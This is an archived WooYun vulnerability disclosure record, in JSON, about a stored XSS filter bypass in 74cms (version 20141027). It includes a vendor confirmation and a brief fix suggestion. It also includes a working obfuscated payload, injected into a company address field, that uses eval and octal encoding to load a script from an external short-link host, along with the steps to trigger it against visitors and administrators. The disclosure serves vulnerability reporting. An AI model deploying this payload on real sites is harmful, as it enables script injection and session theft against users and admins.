{"id": 47078, "wybug_id": "wooyun-2014-081690", "wybug_title": "74cms(20141027)全局xss防护考虑不完善可被绕过", "wybug_corp": "74c,s.com", "wybug_author": "JJ Fly", "wybug_date": "2014-11-07 17:05", "wybug_open_date": "2015-02-05 17:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向公众公开  简要描述： 74cms(20141027)全局xss防护考虑不完善可被绕过 详细说明：  防护代码就不贴出来了，代码中只考虑了 新建标签的情况 或者在a img之类的标签节点中。但是没有考虑下面这种的情况\n<script>Var xx=”qiyeid”;</script>\n这样的话，我们就可以这样利用\n<script>Var xx=”qiyeid”;eval(‘documnet.write(js 8进制编码)’)//</script>\n   漏洞证明：  正好找到了一处存储xss。直接贴利用方法先来注册一个企业帐号\n\nhttp://localhost/74/user/company/company_info.php?act=company_profile重点利用在详细地址这，不过我们需要设置一下input的长度大一点 。默认长度为80，但是数据库中为250。然后插上我们的代码。\n\",opts);eval('document.write(\"\\74\\163cript/\\163rc=//t.cn/*****\\76\\74/\\163cript\\76\")')//\n\n\n保存然后再去地图标注一下企业的位置，http://localhost/74/user/company/company_info.php?act=company_map_set\n\n这个位置就随意了。然后等用户查看企业时  或者管理员在后台审核企业时 \n\n会打开如下url  http://localhost/74/company/company-show.php?id=1(前台也可见，为企业的展示页面)\n\n   修复方案：  把在script中的情况也考虑下。   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-08 12:22 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}